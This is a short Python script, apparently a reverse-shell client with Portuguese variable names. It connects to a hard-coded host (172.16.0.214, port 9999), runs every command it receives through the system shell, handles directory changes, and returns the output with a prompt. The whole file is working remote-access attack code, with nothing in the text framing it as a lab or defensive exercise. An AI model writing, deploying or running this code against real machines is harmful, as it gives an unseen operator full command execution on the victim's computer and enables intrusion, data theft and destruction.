import os, socket, subprocess

sock = socket.socket()
host = '172.16.0.214'
port = 9999
sock.connect((host, port))

while True:
    dados = sock.recv(1024)
    if dados[:2].decode('utf-8') == 'cd':
        os.chdir(dados[3:].decode('utf-8'))

    if len(dados) > 0:
        comando = subprocess.Popen(dados[:].decode('utf-8'), shell=True, stdout = subprocess.PIPE, stderr = subprocess.PIPE)
        saida = comando.stdout.read() + comando.stderr.read()
        saida = str(saida, 'utf-8')
        sock.send(str.encode(saida + str(os.getcwd()) + '> '))
        print (saida)

sock.close()
